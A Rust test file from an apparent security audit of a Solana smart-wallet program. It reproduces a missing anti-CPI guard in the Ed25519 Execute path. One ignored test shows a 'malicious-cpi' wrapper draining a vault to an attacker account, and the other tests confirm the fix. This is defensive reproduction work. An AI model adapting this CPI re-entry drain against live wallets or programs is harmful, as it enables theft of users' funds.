//! Reproduction for finding H-1 — the Ed25519 branch of `Execute` is missing
//! the anti-CPI guard that the other two authentication branches have.
//!
//! `auth/secp256r1/mod.rs:67`   `if get_stack_height() > 1 { PermissionDenied }`
//! `execute/immediate.rs:157`   same check, session branch
//! `execute/immediate.rs:118`   Ed25519 branch — no check
//!
//! `Ed25519Authenticator::authenticate` only scans the account list for a
//! signer whose key matches the stored pubkey. Solana propagates `is_signer`
//! into CPI, so any program the user signs a transaction for can re-enter
//! `Execute` and drive the vault PDA.
//!
//! The tests are an A/B on the same wallet, the same wrapper program and the
//! same inner transfer — only the authenticating account differs:
//!
//!   `h1_a` session authority  -> CPI rejected (the guard that already existed)
//!   `h1_b` Ed25519 authority  -> CPI accepted, vault drained. **The hole.**
//!                                `#[ignore]`d now that the guard is hoisted;
//!                                run with `--ignored` against a pre-fix binary.
//!   `h1_c` Ed25519 authority  -> CPI rejected, top-level still works. Live.
//!
//! `h1_a` is the control. Without it a passing `h1_b` would not distinguish
//! "the guard is missing" from "the CPI never reached the program".
//!
//! Requires the wrapper fixture:
//!     ./scripts/build-repro-fixtures.sh
//!     cargo test-sbf --features devnet --test repro_h1_cpi_bypass

mod common;

use common::*;
use solana_sdk::{
    clock::Clock,
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    signature::Keypair,
    signer::Signer,
};

/// `AuthError::PermissionDenied`
const ERR_PERMISSION_DENIED: u32 = 3002;

/// Wrap `inner` so it is executed by `wrapper_program` via CPI instead of
/// directly by the runtime.
///
/// The wrapper takes the target program as account 0 and forwards everything
/// after it verbatim, so account indices inside the compact instruction stay
/// exactly as they were — the only thing that changes is the stack height the
/// LazorKit program observes.
fn via_cpi(wrapper_program: Pubkey, inner: Instruction) -> Instruction {
    let mut accounts = vec![AccountMeta::new_readonly(inner.program_id, false)];
    accounts.extend(inner.accounts);

    Instruction {
        program_id: wrapper_program,
        accounts,
        data: inner.data,
    }
}

/// Create a session key for `wallet`, authorized by its Ed25519 owner.
fn create_session(context: &mut TestContext, wallet: &WalletFixture) -> Keypair {
    let session = Keypair::new();
    let (session_pda, _) = Pubkey::find_program_address(
        &[
            lazorkit_program::seeds::SESSION,
            wallet.wallet_pda.as_ref(),
            session.pubkey().as_ref(),
        ],
        &context.program_id,
    );

    let clock: Clock = context.svm.get_sysvar();
    let expires_at = clock.slot + 100_000;

    let mut data = vec![5u8]; // CreateSession
    data.extend_from_slice(session.pubkey().as_ref());
    data.extend_from_slice(&expires_at.to_le_bytes());
    data.extend_from_slice(&0u16.to_le_bytes()); // actions_len = 0, unrestricted

    // CreateSession is discriminator 5 — not fee-eligible, so no fee suffix.
    let ix = Instruction {
        program_id: context.program_id,
        accounts: vec![
            AccountMeta::new(context.payer.pubkey(), true),
            AccountMeta::new_readonly(wallet.wallet_pda, false),
            AccountMeta::new(wallet.owner_auth_pda, false),
            AccountMeta::new(session_pda, false),
            AccountMeta::new_readonly(solana_sdk::system_program::id(), false),
            AccountMeta::new_readonly(solana_sdk::sysvar::rent::id(), false),
            AccountMeta::new_readonly(wallet.owner.pubkey(), true),
        ],
        data,
    };

    let payer = context.payer.insecure_clone();
    try_send(&mut context.svm, &payer, &[ix], &[&payer, &wallet.owner])
        .expect("CreateSession failed");

    session
}

/// `Execute` authorized by a session key, moving lamports out of the vault.
///
/// Index layout matches `ed25519_execute_accounts`, with the session PDA in
/// the authority slot and the session key as the signer:
///   `0` payer · `1` wallet · `2` session PDA · `3` vault
///   `4` system program · `5` recipient · `6` session key
fn session_execute_ix(
    context: &TestContext,
    wallet: &WalletFixture,
    session: &Keypair,
    recipient: Pubkey,
    lamports: u64,
) -> Instruction {
    let (session_pda, _) = Pubkey::find_program_address(
        &[
            lazorkit_program::seeds::SESSION,
            wallet.wallet_pda.as_ref(),
            session.pubkey().as_ref(),
        ],
        &context.program_id,
    );

    Instruction {
        program_id: context.program_id,
        accounts: with_protocol_fee_accounts(
            vec![
                AccountMeta::new(context.payer.pubkey(), true),
                AccountMeta::new_readonly(wallet.wallet_pda, false),
                AccountMeta::new(session_pda, false),
                AccountMeta::new(wallet.vault_pda, false),
                AccountMeta::new_readonly(solana_sdk::system_program::id(), false),
                AccountMeta::new(recipient, false),
                AccountMeta::new_readonly(session.pubkey(), true),
            ],
            context,
        ),
        data: vault_transfer_execute_data(lamports),
    }
}

fn lamports_of(context: &TestContext, key: &Pubkey) -> u64 {
    context
        .svm
        .get_account(key)
        .map(|a| a.lamports)
        .unwrap_or(0)
}

// ─────────────────────────────────────────────────────────────────────────
// H-1a — CONTROL: the session branch does have the guard
// ─────────────────────────────────────────────────────────────────────────

#[test]
fn h1_a_control_session_execute_is_rejected_through_cpi() {
    let mut context = setup_test();
    let wrapper = load_fixture_program(&mut context.svm, "malicious-cpi");

    let wallet = create_ed25519_wallet(&mut context, 500_000_000);
    let session = create_session(&mut context, &wallet);
    let recipient = Pubkey::new_unique();
    let payer = context.payer.insecure_clone();

    // Sanity: the session works perfectly well as a top-level instruction, so
    // any failure below is about the call path, not about a broken session.
    {
        let direct = session_execute_ix(&context, &wallet, &session, recipient, 1_000_000);
        try_send(&mut context.svm, &payer, &[direct], &[&payer, &session])
            .expect("session Execute should succeed at stack height 1");
        assert_eq!(
            lamports_of(&context, &recipient),
            1_000_000,
            "direct session withdrawal landed"
        );
    }

    // Same instruction, same signers, wrapped in one CPI hop.
    let before = lamports_of(&context, &wallet.vault_pda);
    let inner = session_execute_ix(&context, &wallet, &session, recipient, 100_000_000);
    let wrapped = via_cpi(wrapper, inner);

    assert_custom_error(
        try_send(&mut context.svm, &payer, &[wrapped], &[&payer, &session]),
        ERR_PERMISSION_DENIED,
        "H-1a: immediate.rs:157 rejects session Execute above stack height 1",
    );

    assert_eq!(
        lamports_of(&context, &wallet.vault_pda),
        before,
        "H-1a: guard held, vault untouched"
    );
}

// ─────────────────────────────────────────────────────────────────────────
// H-1b — the Ed25519 branch has no such guard
// ─────────────────────────────────────────────────────────────────────────

/// Kept as the record of what the hole actually did, and runnable against a
/// pre-fix binary with `--ignored`. `h1_c` below is the live assertion.
#[test]
#[ignore = "reproduces pre-fix behaviour; only passes without the stack-height guard"]
fn h1_b_ed25519_execute_drains_vault_through_cpi() {
    let mut context = setup_test();
    let wrapper = load_fixture_program(&mut context.svm, "malicious-cpi");

    let wallet = create_ed25519_wallet(&mut context, 500_000_000);
    let attacker_account = Pubkey::new_unique();
    let payer = context.payer.insecure_clone();

    let vault_before = lamports_of(&context, &wallet.vault_pda);
    let stolen = 400_000_000;

    // The user signs a transaction addressed to `wrapper`, not to LazorKit.
    // In the real world this is any third-party program they interact with;
    // the wallet accounts are visible to it because it was handed them.
    let inner = Instruction {
        program_id: context.program_id,
        accounts: ed25519_execute_accounts(&context, &wallet, attacker_account),
        data: vault_transfer_execute_data(stolen),
    };
    let wrapped = via_cpi(wrapper, inner);

    let result = try_send(
        &mut context.svm,
        &payer,
        &[wrapped],
        &[&payer, &wallet.owner],
    );

    match result {
        Err(failed) => panic!(
            "H-1b did NOT reproduce — the CPI was rejected. If this fails after \
             the fix lands, that is the expected outcome and this test should be \
             inverted to assert rejection.\n{}",
            failed.meta.pretty_logs()
        ),
        Ok(meta) => {
            println!(
                "H-1b reproduced. CU consumed: {}",
                meta.compute_units_consumed
            );
        },
    }

    assert_eq!(
        lamports_of(&context, &attacker_account),
        stolen,
        "H-1b: an intermediary program moved {stolen} lamports out of the vault \
         using only the signature the user gave to that program"
    );
    assert_eq!(
        lamports_of(&context, &wallet.vault_pda),
        vault_before - stolen,
        "H-1b: the vault paid for it"
    );
}

// ─────────────────────────────────────────────────────────────────────────
// H-1c — the fix, stated as a test
// ─────────────────────────────────────────────────────────────────────────

/// The guard, hoisted above the discriminator match in
/// `execute::immediate::process` so it covers all three branches:
///
/// ```ignore
/// if get_stack_height() > 1 {
///     return Err(AuthError::PermissionDenied.into());
/// }
/// ```
///
/// Asserts both halves: the CPI is refused, and the ordinary top-level path
/// still works.
#[test]
fn h1_c_ed25519_execute_should_be_rejected_through_cpi() {
    let mut context = setup_test();
    let wrapper = load_fixture_program(&mut context.svm, "malicious-cpi");

    let wallet = create_ed25519_wallet(&mut context, 500_000_000);
    let attacker_account = Pubkey::new_unique();
    let payer = context.payer.insecure_clone();
    let vault_before = lamports_of(&context, &wallet.vault_pda);

    let inner = Instruction {
        program_id: context.program_id,
        accounts: ed25519_execute_accounts(&context, &wallet, attacker_account),
        data: vault_transfer_execute_data(400_000_000),
    };

    assert_custom_error(
        try_send(
            &mut context.svm,
            &payer,
            &[via_cpi(wrapper, inner)],
            &[&payer, &wallet.owner],
        ),
        ERR_PERMISSION_DENIED,
        "H-1c: Ed25519 Execute must be rejected above stack height 1",
    );

    assert_eq!(
        lamports_of(&context, &wallet.vault_pda),
        vault_before,
        "H-1c: vault untouched"
    );

    // The guard must not break the normal top-level path.
    let direct = Instruction {
        program_id: context.program_id,
        accounts: ed25519_execute_accounts(&context, &wallet, attacker_account),
        data: vault_transfer_execute_data(1_000_000),
    };
    try_send(
        &mut context.svm,
        &payer,
        &[direct],
        &[&payer, &wallet.owner],
    )
    .expect("H-1c: direct Execute must still work");
}
